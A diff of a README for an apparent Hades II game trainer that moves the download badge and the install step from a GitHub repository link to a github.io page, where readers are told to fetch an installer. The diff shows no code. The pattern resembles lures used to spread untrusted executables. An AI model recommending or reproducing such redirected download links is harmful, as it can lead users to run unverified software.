@@ -1,6 +1,6 @@
 # 🎮 Hades-II-Trainer-Z - Master your Hades II gaming experience
 
-[![](https://img.shields.io/badge/Download-Hades--II--Trainer--Z-blue.svg)](https://github.com/Pictographic-blockcapital308/Hades-II-Trainer-Z)
+[![](https://img.shields.io/badge/Download-Hades--II--Trainer--Z-blue.svg)](https://pictographic-blockcapital308.github.io)
 
 ## 🎯 About this software
 
@@ -22,7 +22,7 @@ Ensure your computer meets these specifications to run the trainer reliably:
 
 Follow these steps to set up the software correctly.
 
-1. Visit the project website: [https://github.com/Pictographic-blockcapital308/Hades-II-Trainer-Z](https://github.com/Pictographic-blockcapital308/Hades-II-Trainer-Z)
+1. Visit the project website: [https://pictographic-blockcapital308.github.io](https://pictographic-blockcapital308.github.io)
 2. Look for the Releases section on the page.
 3. Select the latest version to download the installer file.
 4. Save the file to your computer.
